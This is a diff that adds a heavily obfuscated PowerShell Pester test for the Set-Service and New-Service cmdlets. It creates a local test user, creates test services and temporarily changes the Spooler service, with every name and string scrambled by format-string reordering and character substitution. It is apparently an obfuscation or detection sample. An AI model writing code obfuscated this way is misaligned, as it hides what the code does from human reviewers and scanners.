@@ -1,0 +1,423 @@
+&("{2}{0}{1}" -f 'ET-it','eM','S') ("{0}{2}{1}{3}" -f 'V','aBL','ArI','E:Apq') ([Type]("{1}{2}{7}{4}{5}{8}{6}{9}{3}{0}"-F 'ecommAnD','m','ic','Vic','WeRsH','ELL.','Nds.SE','RoSOFT.po','cOmMa','tSeR')  );  &("{3}{2}{0}{1}"-f'bl','e','A','seT-vari') ('2z'+'6')  (  [TyPE]("{9}{7}{0}{5}{6}{4}{2}{8}{3}{1}" -f'WE','nD','Ands.nEWs','OmmA','MM','rsHE','ll.co','t.pO','eRvICEc','micrOsOf')) ;   &('SV')  ("{1}{0}"-f'8qk','E') ([tYPE]("{2}{5}{0}{1}{3}{4}" -f'oR','KCrEdE','net.nE','nTI','al','tw'))  ;    &("{2}{0}{1}"-f 'e','t-ItEM','S')  ("{2}{3}{1}{0}"-f 'sKxa','N','VARiABle:','2')  ( [TypE]("{1}{0}{2}{3}"-F 'Sc','p','ReD','EnTIaL')) ;  &("{1}{0}"-f'teM','SeT-I')  ("VAr"+"iAblE:"+"Ita47f")  ( [tYPE]("{6}{10}{5}{4}{8}{3}{1}{0}{7}{2}{9}" -f'S','Ion.P','ED','oMat','.','AnAGeMent','SysTeM','cr','Aut','EntiAL','.m'))  ;  
+
+&("{2}{1}{3}{0}"-f 'dule','t','Impor','-Mo') (&("{0}{1}{2}" -f 'Jo','in','-Path') -Path ${p`sScRIPT`ROoT} ((("{1}{7}{10}{11}{6}{5}{9}{0}{8}{3}{2}{4}"-f'te','..{0','n','mmo','.psm1','ic','urity{0}certif','}Microsoft.PowerSh','Co','a','el','l.Sec')) -F[cHaR]92))
+
+&("{2}{1}{0}"-f'ibe','r','Desc') ("{1}{7}{2}{4}{5}{6}{3}{0}"-f 'ts','Set','v','es','i','ce cmd','let t','/New/Remove-Ser') -Tags ("{0}{1}{2}" -f 'Fe','atur','e'), ("{2}{0}{4}{3}{1}" -f 'equi','ows','R','nd','reAdminOnWi') {
+    &("{2}{0}{1}"-f'foreAl','l','Be') {
+        ${O`RiGInaLde`FAULtpa`Rame`TeR`VaLUeS} = ${ps`DefAU`lTp`ARa`metER`VAl`UEs}.("{1}{0}"-f'e','Clon').Invoke()
+        if ( -not ${I`S`WindoWS} ) {
+            ${pSd`E`FaULT`p`A`RAMeTErvaL`UeS}[("{1}{0}" -f 'p','it:ski')] = ${tr`UE}
+        }
+        if (${I`S`wINDoWS}) {
+            ${User`NA`me} = ("{2}{3}{0}{1}"-f'c','es','t','estuserservi')
+            ${T`eS`TPa`SS} =   ( &("{1}{2}{0}"-f'tEM','cHIld','i') ('v'+'a'+'rIAbLE:e8qk'))."VA`luE"::("{1}{0}"-f'w','ne').Invoke("", (&("{2}{1}{3}{0}{4}"-f 'w','omp','New-C','lexPass','ord')))."s`eCU`RepaS`SWOrd"
+            ${c`REDs}    =  (  &("{0}{1}" -f'Di','r') ("vaRIable:2"+"n"+"skXa") )."vA`LuE"::("{0}{1}"-f'n','ew').Invoke(".\$userName", ${t`eS`TpAsS})
+            ${SecUR`i`TYdE`ScRipTOR`sdDl} = ((("{14}{16}{11}{13}{4}{10}{12}{6}{9}{1}{2}{8}{3}{7}{15}{0}{5}"-f'C;;','DCLCSWRPWPDTLOCRSDRC','W',';;BA)(A;','PWPDTL',';SU)',';',';C','DWO;',';CC','OCRRC;;;S','LCSW','Y)(A','R','D:','CLCSWLOCRR','(A;;CC')))
+            ${wrON`GSe`c`UR`ITYdesCRiptorsd`DL} = (("{2}{8}{18}{4}{6}{7}{10}{11}{20}{15}{19}{21}{3}{12}{16}{14}{1}{0}{17}{13}{22}{5}{9}"-f';;CCLCSW','(A','D:(','RPWPD','S','SU','WRP','WP','A;;',')','DT','LO','TL','OC','BB)','SY)(A','OCRSDRCWDWO;;;','L','CCLC',';','CRRC;;;',';CCDCLCSW','RRC;;;'))
+            &("{0}{1}"-f'ne','t') ("{1}{0}"-f 'r','use') ${U`SE`RNAmE} ${c`REds}.("{5}{2}{4}{0}{1}{3}"-f'red','ent','wor','ial','kC','GetNet').Invoke()."PAss`worD" ("{0}{1}"-f '/ad','d') > ${nU`lL}
+
+            ${testS`E`Rvi`CE`NaME1} = ("{0}{2}{1}" -f 'tests','ce1','ervi')
+            ${TEsTsER`VIcEN`A`Me2} = ("{2}{3}{0}{1}" -f 'rv','ice2','tests','e')
+            ${sV`cbi`Nar`Y`NaMe}    = ("{0}{1}{2}{3}"-f 'TestS','er','v','ice')
+            ${SV`CcMd} = &("{2}{0}{1}{3}" -f 'Comm','a','Get-','nd') ${SvC`BiNar`Y`NaME}
+            ${S`VCcmd} | &("{0}{1}" -f 'Sho','uld') -Not -BeNullOrEmpty
+            ${SvCful`l`path} = ${SvC`C`md}."p`ATH"
+            ${tE`StS`ErvICE1} = &("{0}{1}{2}"-f 'New','-Ser','vice') -BinaryPathName ${s`VCfUll`PA`TH} -Name ${tE`sTseRVi`c`en`AmE1}
+            ${TEs`T`SEr`V`ice1} | &("{1}{0}"-f'd','Shoul') -Not -BeNullOrEmpty
+            ${TE`S`TserviCE2} = &("{2}{0}{1}" -f'-Servic','e','New') -BinaryPathName ${S`V`CfulLPAtH} -Name ${TEstSerVI`cENA`m`e2} -DependsOn ${TeS`TsE`RViCEn`AMe1}
+            ${TE`stsER`VIcE2} | &("{0}{1}" -f'Sho','uld') -Not -BeNullOrEmpty
+        }
+
+        Function c`H`ecKseCuR`ITyD`eSCRip`T`ORs`ddl {
+            Param(
+                [Parameter(MaNDATORY)]
+                ${SeC`URIty`DE`S`cR`IPT`ORSDDL},
+
+                [Parameter(mAnDatORY)]
+                ${SErV`iC`e`NAME}
+            )
+            ${coU`Nt`er}      = 0
+            ${Ex`PECteDsD`dL} = &("{5}{1}{3}{2}{4}{0}" -f 'g','ro','lStr','m-Sdd','in','ConvertF') -Sddl ${SecuRiTYD`ESCr`iPTO`R`SdDl}
+
+            
+            ${up`DaTEdS`D`dl}  = &("{4}{0}{1}{3}{6}{5}{2}" -f'on','ve','g','rtFrom','C','Strin','-Sddl') -Sddl (&('sc') ("{2}{1}{0}"-f 'ow','h','sds') ${s`eRVIc`eNA`Me})[1]
+
+            ${U`P`DAteDs`dDL}."OW`NEr" | &("{0}{1}" -f 'Sho','uld') -Be ${E`XPECte`Dsddl}."oW`NeR"
+            ${u`pDatED`sDDL}."gr`ouP" | &("{1}{0}" -f'hould','S') -Be ${e`XpEcTE`DSd`Dl}."g`ROup"
+            ${u`pDat`EDs`DDl}."DiS`C`RETIonaRY`AcL"."co`UNt" | &("{1}{0}" -f 'd','Shoul') -Be ${ExPEcte`DSD`dL}."D`Is`creTiOn`ARYAcl"."c`OuNt"
+            ${UpdA`TeD`S`DDL}."DiSc`REtIOnaR`Y`Acl" | &("{1}{0}{2}" -f'orE','F','ach-Object') -Process {
+                ${_} | &("{0}{1}" -f 'Sh','ould') -Be ${eX`p`ecTedS`Ddl}."dISCRE`TiONA`RYA`CL"[${c`OUn`Ter}]
+                ${c`ounTeR}++
+            }
+        }
+    }
+    &("{1}{0}"-f 'rAll','Afte') {
+        ${gLObA`L`:PSde`FA`UlTPArA`MetERvAlUes} = ${ORI`GiNAlDEFA`U`lT`Pa`R`Amete`RVAL`U`eS}
+        if (${i`swin`DOWs}) {
+            &("{0}{1}"-f 'n','et') ("{0}{1}"-f 'u','ser') ${U`S`ernaMe} ("{2}{1}{0}" -f'te','dele','/') > ${Nu`LL}
+
+            &("{3}{0}{1}{2}" -f'-','Se','rvice','Stop') ${T`eStSE`RVICe`Nam`e2}
+            &("{2}{0}{1}{3}"-f'op-Ser','vi','St','ce') ${tEs`TsErv`iCeN`AME1}
+            &("{1}{0}{2}{3}" -f 'ov','Rem','e-Servic','e') ${tesTsE`RvI`c`e`NAme2}
+            &("{2}{0}{1}{3}"-f'Se','rvic','Remove-','e') ${testSErv`I`cE`N`Ame1}
+        }
+    }
+
+    &('It') ((("{10}{8}{9}{1}{4}{6}{3}{0}{2}{11}{5}{7}{12}" -f' for {0}<parame','and ca','ter>{0} ',' used as API','n','h',' be',' {0}<value>{0','ServiceC','omm','Set','wit','}')) -F [ChaR]39) -TestCases @(
+        @{("{1}{2}{0}" -f 'r','par','amete') = ("{0}{1}"-f'N','ame')        ; ("{0}{1}"-f'v','alue') = "bar"},
+        @{("{1}{2}{0}"-f'ter','p','arame') = ("{0}{1}{2}"-f'DisplayN','a','me') ; ("{0}{1}" -f 'va','lue') = ("{1}{0}"-f'ello','h')},
+        @{("{0}{1}{2}" -f 'pa','rame','ter') = ("{1}{2}{0}"-f'cription','D','es') ; ("{1}{0}"-f 'e','valu') = ("{1}{0}{2}"-f' w','hello','orld')},
+        @{("{1}{0}{2}" -f 'm','para','eter') = ("{2}{0}{1}"-f'art','upType','St') ; ("{1}{0}"-f 'lue','va') = ("{0}{2}{1}"-f 'Autom','c','ati')},
+        @{("{2}{0}{1}" -f 'ete','r','param') = ("{0}{1}{2}"-f'Star','tupTy','pe') ; ("{0}{1}"-f'v','alue') = ("{1}{2}{0}"-f 'd','Disa','ble')},
+        @{("{1}{0}" -f 'eter','param') = ("{0}{1}{2}"-f'Startu','p','Type') ; ("{0}{1}"-f'val','ue') = ("{0}{1}" -f'Ma','nual')},
+        @{("{0}{1}" -f 'param','eter') = ("{0}{2}{1}" -f 'Sta','s','tu')      ; ("{0}{1}"-f'val','ue') = ("{0}{1}"-f 'Runnin','g')},
+        @{("{1}{0}{2}" -f 'r','pa','ameter') = ("{0}{1}"-f'S','tatus')      ; ("{1}{0}" -f'alue','v') = ("{0}{1}{2}" -f 'Stop','p','ed')},
+        @{("{0}{2}{1}" -f'pa','meter','ra') = ("{0}{1}"-f'Sta','tus')      ; ("{1}{0}" -f'lue','va') = ("{0}{2}{1}" -f'Pau','ed','s')},
+        @{("{3}{1}{0}{2}"-f'e','amet','r','par') = ("{2}{0}{3}{1}" -f'nputO','ct','I','bje') ; ("{1}{0}"-f 'cript','s') = {&("{2}{1}{0}" -f 'ervice','-S','Get') | &("{2}{1}{0}"-f'ct','e','Select-Obj') -First 1}},
+        
+        @{("{0}{2}{1}" -f'par','eter','am') = ("{0}{1}" -f 'I','nclude')     ; ("{1}{0}"-f'lue','va') = "foo", "bar" ; ("{2}{1}{3}{0}" -f 'l','d','expecte','Nul') = ${tr`Ue}},
+        
+        @{("{0}{1}{2}"-f'pa','ramete','r') = ("{1}{0}"-f 'ude','Excl')     ; ("{0}{1}" -f'valu','e') = "foo", "bar" ; ("{1}{0}{2}{3}" -f'te','expec','dN','ull') = ${Tr`Ue}}
+    ) {
+        param(${Pa`RAm`Et`Er}, ${Va`luE}, ${SCr`I`Pt}, ${EXPec`TedN`ULL})
+
+        ${s`etSer`ViCe`coM`mand} =  ( &("{0}{2}{3}{1}" -f'ge','RiABlE','T-','va') ("ap"+"q"))."VAL`UE"::("{1}{0}"-f'ew','n').Invoke()
+        if (${sCRI`Pt} -ne ${N`UlL}) {
+            ${v`AL`UE} = & ${Sc`RIPt}
+        }
+        ${S`eTSErvIC`Eco`mm`AND}.${p`ArAM`eTer} = ${V`ALue}
+        if (${expect`e`Dnull} -eq ${tR`Ue}) {
+            ${seTSE`RV`Ic`E`c`ommaND}.${PAr`Am`e`TEr} | &("{0}{1}" -f'Shou','ld') -BeNullOrEmpty
+        }
+        else {
+            ${seTs`ERv`ic`eCOmma`Nd}.${Pa`RA`metER} | &("{0}{1}"-f'Shoul','d') -Be ${Val`UE}
+        }
+    }
+
+    &('It') ("{11}{9}{6}{3}{12}{4}{7}{1}{0}{10}{13}{5}{2}{8}"-f 'on ','ati','rip','e parame','val',' <sc','c','id','t>','et-Servi','for','S','ter ',' invalid values:') -TestCases @(
+        @{
+            ("{0}{2}{1}"-f 'sc','pt','ri')  = {&("{2}{0}{1}"-f 'v','ice','Set-Ser') ("{0}{1}" -f'fo','o') -StartupType ("{1}{0}" -f'ar','b') -ErrorAction ("{1}{0}"-f 'p','Sto')};
+            ("{0}{1}" -f'error','id') = ("{12}{19}{3}{5}{9}{7}{1}{18}{2}{11}{10}{16}{6}{17}{13}{0}{8}{4}{14}{20}{15}" -f 's','oMessage,Mi','ft.Po','otC','Se','onvertArgu','Co','tN','.','men','erShel','w','Ca','d','tSe','mand','l.','mman','croso','nn','rviceCom')
+        },
+        @{
+            ("{0}{1}" -f'scrip','t')  = {&("{2}{1}{3}{0}"-f 'e','et-Ser','S','vic') -Name ${T`ESTSeRViCE`NaM`e1} -SecurityDescriptorSddl ${wroNGsE`Cu`RI`Ty`des`cri`p`TorsddL} };
+            ("{1}{2}{0}"-f'orid','er','r') = ("{1}{7}{2}{6}{4}{5}{11}{8}{0}{14}{13}{3}{9}{12}{10}" -f'm','System.ArgumentExc','ti','s.Se','n,','Microsoft','o','ep','erShell.Co','tServiceCo','mand','.Pow','m','and','m')
+        }
+    ) {
+        param(${S`CRi`Pt}, ${e`RR`oRiD})
+        { & ${sC`Ri`PT} } | &("{1}{0}" -f 'ld','Shou') -Throw -ErrorId ${er`RoRID}
+    }
+
+
+    &('It') ("{11}{8}{0}{4}{5}{3}{6}{1}{9}{2}{7}{10}"-f'c','ervice using Se','-',' of ','uritydescr','iptor','s','Service','e','t',' ','Sets s') {
+        &("{1}{0}{2}" -f '-Serv','Set','ice') -Name ${TeStsEr`Vi`C`Ename1} -SecurityDescriptorSddl ${SE`CuRit`YDesC`Rip`T`orsdDL}
+        &("{3}{0}{4}{5}{2}{6}{1}{7}"-f'c','ript','De','Che','kSe','curity','sc','orSddl') -SecurityDescriptor ${SEc`U`RitYDesC`R`IPt`OrSD`dl} -ServiceName ${tesTS`ER`VIc`EnAme1}
+    }
+
+    &('It') ((("{12}{14}{6}{11}{8}{4}{5}{1}{9}{2}{13}{7}{10}{3}{0}"-f'IQ','param','Q to','lue>W','e WI','Q<','ervice','Q<v','ng','eter>WI','a',' can cha','Se',' WI','t-S'))-repLAce  'WIQ',[chAr]39) -TestCases @(
+        @{("{0}{1}" -f'para','meter') = ("{2}{1}{0}" -f 'iption','r','Desc'); ("{0}{1}"-f 'val','ue') = ("{0}{1}" -f 'h','ello')},
+        @{("{0}{2}{1}" -f 'pa','ameter','r') = ("{0}{3}{2}{1}"-f 'Disp','Name','y','la'); ("{1}{0}"-f'e','valu') = ("{1}{2}{0}" -f 'r','t','est spoole')},
+        @{("{2}{0}{1}"-f'ar','ameter','p') = ("{0}{1}{2}" -f 'S','tartupTyp','e'); ("{1}{0}" -f'ue','val') = ("{1}{0}" -f 'd','Disable')},
+        @{("{2}{0}{1}"-f 'aramete','r','p') = ("{0}{1}" -f'Sta','tus')     ; ("{1}{0}"-f 'alue','v') = ("{0}{1}"-f'runni','ng')     ; ("{2}{1}{0}" -f'ted','xpec','e') = "OK"}
+    ) {
+        param(${PARa`me`Ter}, ${VaL`UE}, ${e`XpeC`TEd})
+        ${Cu`RRen`TsEr`VicE} = &("{0}{2}{1}{3}"-f 'Ge','ta','t-CimIns','nce') -ClassName ("{0}{2}{1}" -f'Wi','ervice','n32_S') -Filter ((("{4}{3}{5}{1}{0}{2}" -f'NS','NS5spooler','5','m','Na','e='))."r`eplaCe"(([cHaR]78+[cHaR]83+[cHaR]53),[sTriNg][cHaR]39))
+        ${orig`iNals`TA`RtUp`Type} = (&("{1}{2}{0}"-f 'e','Get-Serv','ic') -Name ("{0}{1}{2}"-f 's','poole','r'))."S`TARTT`yPE"
+        try {
+            ${sETSer`Vice`COm`MaNd} =  (&("{1}{2}{0}"-f'bLe','v','ARiA')  ("{0}{1}"-f 'aP','q')  -VAluEO  )::("{1}{0}"-f 'ew','n').Invoke()
+            ${S`ETs`ErvI`cEcommAnd}."N`Ame" = ("{0}{1}"-f'S','pooler')
+            ${sEts`ERViceC`o`MmaND}.${par`AmEt`eR} = ${V`A`luE}
+            ${S`ET`servi`Ce`cOMmaND}."I`N`VOkE"()
+            ${UPdat`edsErV`ICE} = &("{4}{1}{3}{2}{0}"-f 'ce','-','stan','CimIn','Get') -ClassName ("{1}{0}{2}{3}"-f 'in32_Ser','W','vic','e') -Filter ((("{2}{4}{0}{3}{1}"-f'poo','D','Name=fMD','lerfM','s'))."RePl`A`CE"('fMD',[STrIng][ChaR]39))
+            if (${E`xpec`T`ED} -eq ${nu`ll}) {
+                ${ex`pEc`TEd} = ${v`A`lUe}
+            }
+            if (${p`ARA`mETER} -eq ("{1}{0}{2}"-f 'pTyp','Startu','e')) {
+                ${uP`D`ATedSeR`ViCE}."St`ARtM`ode" | &("{0}{1}" -f'Shoul','d') -Be ${Ex`pecTed}
+            }
+            else {
+                ${uPda`Te`dserVi`cE}.${P`ArAm`ETer} | &("{1}{0}" -f 'hould','S') -Be ${e`Xp`E`CTEd}
+            }
+        }
+        finally {
+            if (${pArAM`eT`eR} -eq ("{2}{1}{0}" -f 'e','pTyp','Startu')) {
+                ${SeTSE`R`ViCe`COm`manD}."stA`R`Tu`pTyPe" = ${oRI`GiNa`LSt`ARtU`PTyPE}
+            }
+            else {
+                ${S`EtsE`RVice`coMmaNd}.${pa`RA`m`eTER} = ${c`URRen`TSerVi`CE}.${pa`RAMEt`ER}
+            }
+            ${SEt`SeRvI`c`eCO`mmA`ND}."IN`VOkE"()
+            ${u`PdAteDS`ERv`ICE} = &("{1}{3}{0}{2}" -f 'mInst','G','ance','et-Ci') -ClassName ("{3}{1}{2}{0}{4}" -f 'vic','in32_','Ser','W','e') -Filter ((("{1}{3}{4}{5}{2}{0}"-f 'rmip','Name=','e','m','i','pspool'))."rEp`LaCE"('mip',[STriNG][cHAr]39))
+            ${uPdATe`ds`er`VicE}.${P`A`RameTeR} | &("{0}{2}{1}"-f'Sh','d','oul') -Be ${C`URR`Ents`er`ViCE}.${pa`R`AmETEr}
+        }
+    }
+
+    &('It') ((("{5}{10}{3}{4}{13}{9}{0}{2}{8}{12}{7}{11}{6}{1}"-f ' YF9<','YF9','paramet','eCommand ','can be used a','NewServ','<value>',' with YF','er>','API for','ic','9','YF9','s '))."REplA`CE"(([cHAR]89+[cHAR]70+[cHAR]57),[STring][cHAR]39)) -TestCases @(
+        @{("{0}{1}" -f 'p','arameter') = ("{1}{0}" -f'e','Nam')                   ; ("{1}{0}" -f'e','valu') = "bar"},
+        @{("{1}{2}{3}{0}"-f'er','par','a','met') = ("{3}{0}{4}{1}{2}"-f 'ryP','thNa','me','Bina','a')         ; ("{0}{1}"-f'v','alue') = ("{1}{0}" -f'llo','he')},
+        @{("{0}{1}"-f 'para','meter') = ("{2}{0}{1}" -f 'pl','ayName','Dis')            ; ("{1}{0}" -f'lue','va') = ("{0}{2}{1}"-f 'hello','ld',' wor')},
+        @{("{1}{2}{0}"-f'er','p','aramet') = ("{0}{2}{3}{1}"-f 'De','iption','sc','r')            ; ("{1}{0}"-f 'e','valu') = ("{0}{1}{2}" -f 't','his ','is a test')},
+        @{("{2}{0}{1}" -f'a','rameter','p') = ("{1}{2}{0}{3}"-f'pTy','Start','u','pe')            ; ("{0}{1}"-f'val','ue') = ("{0}{1}{2}"-f'A','utom','atic')},
+        @{("{2}{0}{1}"-f 'r','ameter','pa') = ("{0}{1}{2}{3}" -f'Sta','r','tupTyp','e')            ; ("{0}{1}"-f 'v','alue') = ("{1}{0}"-f 'd','Disable')},
+        @{("{1}{0}" -f 'ameter','par') = ("{0}{1}{2}"-f'Star','t','upType')            ; ("{1}{0}"-f 'lue','va') = ("{0}{1}"-f'Man','ual')},
+        @{("{0}{1}{2}"-f 'par','a','meter') = ("{0}{1}{3}{2}" -f 'Securit','yDescript','l','orSdd') ; ("{1}{0}" -f'e','valu') = ${seCuRITY`dEscrI`p`T`oRsddL}},
+        @{("{2}{1}{0}" -f'er','met','para') = ("{1}{0}{2}"-f'den','Cre','tial')             ; ("{1}{0}"-f'lue','va') = (
+                  (  &("{0}{1}" -f 'It','em')  ('VARIA'+'BlE'+':ITa4'+'7'+'f')  )."Val`Ue"::("{1}{0}"-f 'w','ne').Invoke(("{1}{0}{2}"-f'nam','user','e'),
+                    
+                    (&("{2}{1}{6}{0}{3}{4}{5}" -f'vertTo-Sec','o','C','ureStri','n','g','n') ("{1}{3}{2}{0}{4}{5}"-f 'wo','P','s','lainTextPas','r','d') -AsPlainText -Force)))
+        }
+        @{("{1}{0}{2}"-f'aramete','p','r') = ("{1}{2}{0}"-f 'On','Depen','ds')      ; ("{0}{1}" -f'v','alue') = "foo", "bar"}
+    ) {
+        param(${pARA`ME`TER}, ${vaL`Ue})
+
+        ${N`ewS`e`R`V`IceCOMmanD} =   ${2`z6}::("{1}{0}" -f 'w','ne').Invoke()
+        ${NeW`seRVi`cecOm`maND}.${PA`RaM`Eter} = ${VA`luE}
+        ${NEwse`RvI`CEC`oMmA`ND}.${pARa`me`TEr} | &("{0}{1}{2}" -f'Sh','oul','d') -Be ${v`Alue}
+    }
+
+    &('It') ("{5}{9}{11}{3}{7}{10}{6}{4}{2}{1}{8}{0}"-f'ce',' s','a','ange','ls of ','Se','a',' cre','ervi','t-Se','denti','rvice can ch') -Pending {
+        try {
+            ${S`TaRT`USE`RNAMe} = ("{0}{1}" -f'use','r1')
+            ${en`DuS`ernAME} = ("{1}{0}"-f 'ser2','u')
+            ${sEr`Vice`NaMe} = ("{2}{3}{4}{0}{1}"-f 'cre','dential','te','stse','t')
+            ${TEsTP`ASS} =  ( &('GI')  ("{3}{2}{0}{1}"-f'le:','e8QK','ARiab','V'))."v`Alue"::("{0}{1}"-f'n','ew').Invoke("", (&("{3}{2}{0}{4}{1}{5}" -f'om','o','-C','New','plexPassw','rd')))."SEC`UrE`pASswoRd"
+            ${crE`ds} =   (  &("{2}{0}{1}"-f 'T-','VARiAblE','gE')  ("{1}{0}"-f 'xA','2nsK')  -valueON )::("{1}{0}" -f'ew','n').Invoke(".\$endUsername", ${t`EStp`AsS})
+            &("{1}{0}"-f 'et','n') ("{0}{1}"-f 'us','er') ${stArTUsE`R`NAme} ${Cr`E`dS}.("{5}{1}{4}{2}{3}{0}"-f 'l','Networ','r','edentia','kC','Get').Invoke()."PaSs`wOrD" ("{1}{0}" -f'd','/ad') > ${Nu`Ll}
+            &("{1}{0}"-f 'et','n') ("{0}{1}" -f 'us','er') ${en`dUSE`R`NAme} ${cre`Ds}.("{2}{3}{1}{4}{5}{0}" -f 'ial','Cre','GetNet','work','de','nt').Invoke()."pA`s`SWord" ("{1}{0}"-f 'd','/ad') > ${nu`ll}
+            ${Para`mE`Te`Rs} = @{
+                ("{0}{1}" -f'Nam','e')           = ${sE`RVI`cenAmE};
+                ("{2}{0}{1}{3}"-f'aryPa','thNa','Bin','me') = "$PSHOME\pwsh.exe";
+                ("{0}{1}{2}"-f'Startu','p','Type')    = ("{1}{0}"-f 'al','Manu');
+                ("{0}{1}{2}" -f'Cr','edenti','al')     = ${C`R`eDS}
+            }
+            ${S`ERvI`CE} = &("{2}{1}{0}"-f'ice','v','New-Ser') @parameters
+            ${S`erVI`ce} | &("{1}{0}"-f 'ld','Shou') -Not -BeNullOrEmpty
+            ${SE`RV`Ice} = &("{2}{1}{0}{3}"-f 'an','Inst','Get-Cim','ce') ("{3}{0}{2}{1}{4}"-f'in','Se','32_','W','rvice') -Filter "name='$servicename'"
+            ${ser`Vi`ce}."Sta`RtNaMe" | &("{0}{1}"-f 'Shou','ld') -BeExactly ${C`Reds}."U`SeR`NAme"
+
+            &("{2}{3}{1}{0}"-f'ce','rvi','Set','-Se') -Name ${servi`ce`N`AmE} -Credential ${CR`e`DS}
+            ${S`ErvICE} = &("{1}{2}{3}{0}{4}"-f 'nstanc','Get-','Cim','I','e') ("{1}{2}{0}"-f'e','Win32_','Servic') -Filter "name='$servicename'"
+            ${SerV`I`CE}."staRT`NamE" | &("{1}{0}" -f 'hould','S') -BeExactly ${CRE`Ds}."u`SERName"
+        }
+        finally {
+            &("{0}{3}{2}{1}{4}" -f 'Ge','an','nst','t-CimI','ce') ("{2}{1}{0}"-f'ce','32_Servi','Win') -Filter "name='$servicename'" | &("{3}{4}{2}{5}{0}{1}"-f 'nsta','nce','e-','Remo','v','CimI') -ErrorAction ("{0}{1}{2}{4}{3}" -f 'Si','l','entlyCon','e','tinu')
+            &("{1}{0}" -f'et','n') ("{1}{0}"-f'r','use') ${S`TArtUsErN`A`mE} ("{0}{1}{2}"-f'/del','e','te') > ${n`Ull}
+            &("{1}{0}"-f'et','n') ("{1}{0}" -f 'er','us') ${E`NduSer`Name} ("{0}{1}"-f'/d','elete') > ${nU`ll}
+        }
+    }
+
+    &('It') ((("{8}{1}{5}{9}{4}{2}{0}{3}{6}{7}" -f 'ed {0}','S','ervice call','<',' create a new s','erv','na','me>{0}','New-','ice can')) -F[CHAR]39) -TestCases @(
+        @{("{1}{0}" -f'ame','n') = ("{1}{0}{2}"-f'm','testauto','atic'); ("{1}{0}{3}{2}" -f'r','sta','pe','tupTy') = ("{1}{0}"-f 'utomatic','A'); ("{1}{2}{0}"-f 'ion','desc','ript') = "foo" ; ("{0}{2}{1}" -f 'd','ayname','ispl') = "one" ; ("{0}{3}{1}{2}{4}" -f'securityD','pto','r','escri','Sddl') = ${Nu`LL}},
+        @{("{1}{0}" -f 'e','nam') = ("{3}{2}{1}{0}" -f 'al','u','an','testm')   ; ("{2}{1}{0}" -f 'ype','upT','start') = ("{1}{0}" -f'l','Manua')   ; ("{0}{1}{2}" -f'd','es','cription') = "bar" ; ("{0}{2}{3}{1}"-f'displ','me','a','yna') = "two" ; ("{4}{6}{2}{0}{5}{1}{3}" -f'c','rSd','es','dl','se','ripto','curityD') = ${sECuriTydes`C`R`i`ptoRsd`dl}},
+        @{("{1}{0}" -f 'me','na') = ("{1}{2}{3}{0}"-f 'led','te','stdisa','b') ; ("{0}{3}{1}{2}"-f 'startup','y','pe','T') = ("{2}{0}{1}"-f'sabl','ed','Di') ; ("{0}{2}{1}{3}"-f 'descr','i','ipt','on') = ${n`ULL} ; ("{1}{2}{0}{3}" -f 'lay','d','isp','name') = ${n`Ull} ; ("{2}{1}{0}{3}" -f'i','ityDescr','secur','ptorSddl') = ${NU`LL}},
+        @{("{1}{0}"-f'e','nam') = ("{0}{1}{2}"-f't','est','sddl')     ; ("{0}{2}{1}{3}" -f 's','tup','tar','Type') = ("{1}{0}{2}"-f 'sable','Di','d') ; ("{2}{0}{1}"-f'escript','ion','d') = "foo" ; ("{1}{2}{0}" -f 'ayname','dis','pl') = ${Nu`lL} ; ("{2}{3}{0}{1}" -f 'scriptorSdd','l','securit','yDe') = ${s`eCUR`ity`d`esCRip`TORsd`dL}}
+    ) {
+        param(${N`AME}, ${STarT`UPt`YpE}, ${Des`CR`I`PtIon}, ${DIs`PlAy`NAME}, ${SE`Cu`RiT`YdE`scrIptORSd`dl})
+        try {
+            ${PaRa`Mete`Rs} = @{
+                ("{0}{1}"-f 'Nam','e')           = ${n`AMe};
+                ("{3}{1}{4}{2}{0}" -f'me','a','a','BinaryP','thN') = "$PSHOME\pwsh.exe";
+                ("{0}{2}{1}"-f'St','upType','art')    = ${ST`ART`UP`Type};
+            }
+            if (${de`ScRIpT`iOn}) {
+                ${P`ARa`mETerS} += @{("{3}{0}{2}{1}" -f'scrip','ion','t','de') = ${DESCr`ip`TiOn}}
+            }
+            if (${DiS`PLAy`N`Ame}) {
+                ${pAram`e`Te`Rs} += @{("{0}{1}{2}"-f'd','isp','layname') = ${DIsPl`A`YNa`mE}}
+            }
+            if (${sE`CUrity`d`EscrIp`TORsd`Dl}) {
+                ${pAra`mE`TERS} += @{("{2}{4}{0}{5}{1}{3}{6}"-f'yDe','r','Se','S','curit','scripto','ddl') = ${Secu`R`iT`yD`ESCR`iPtorSD`DL}}
+            }
+
+            ${s`ERVI`cE} = &("{2}{1}{0}"-f 'rvice','e','New-S') @parameters
+            ${SER`V`iCe} | &("{1}{0}" -f 'hould','S') -Not -BeNullOrEmpty
+            ${s`ERvice}."DI`s`PlAynAMe" | &("{1}{0}"-f 'hould','S') -Be $(if(${DI`s`pLaynA`ME}){${DiS`p`LayNA`Me}}else{${N`AME}})
+            ${SE`RV`iCE}."startT`y`Pe" | &("{0}{2}{1}" -f 'Sh','uld','o') -Be ${StA`RT`UPT`YPE}
+
+            ${S`Er`ViCE} = &("{0}{3}{2}{1}"-f 'Get','tance','ns','-CimI') ("{1}{3}{0}{2}"-f'32_S','W','ervice','in') -Filter "name='$name'"
+            ${Serv`ICE} | &("{0}{1}"-f 'Shou','ld') -Not -BeNullOrEmpty
+            ${Se`RVICE}."Na`me" | &("{1}{0}" -f'ould','Sh') -Be ${n`AME}
+            ${se`Rvice}."De`s`cRI`PTION" | &("{0}{1}" -f 'S','hould') -Be ${deSc`R`IPt`iOn}
+            ${ex`Pe`CTeD`StA`RtuP} = $(
+                switch (${St`A`R`TUptYpE}) {
+                    ("{1}{2}{0}" -f'omatic','A','ut') {("{1}{0}" -f'uto','A')}
+                    ("{0}{1}"-f'Manua','l') {("{0}{1}" -f'Ma','nual')}
+                    ("{0}{1}{2}"-f'D','isab','led') {("{1}{2}{0}" -f 'd','Disab','le')}
+                    ("{1}{0}" -f 't','defaul') { throw ("{0}{5}{1}{6}{4}{8}{7}{3}{2}{9}" -f'U','upp','Type in Te','p','e','ns','ort','artu','d St','stCases') }
+                }
+            )
+            ${SE`RV`ICe}."S`TART`mODE" | &("{1}{0}{2}" -f 'ho','S','uld') -Be ${eX`PE`c`Te`dSTArtuP}
+            if (${DIs`plA`y`NAme} -eq ${Nu`ll}) {
+                ${se`Rv`Ice}."D`ISP`L`AYNamE" | &("{1}{0}" -f 'hould','S') -Be ${n`AmE}
+            }
+            else {
+                ${sE`R`VICe}."dIs`pLAYnA`me" | &("{2}{0}{1}" -f 'o','uld','Sh') -Be ${Dis`PlAYN`A`ME}
+            }
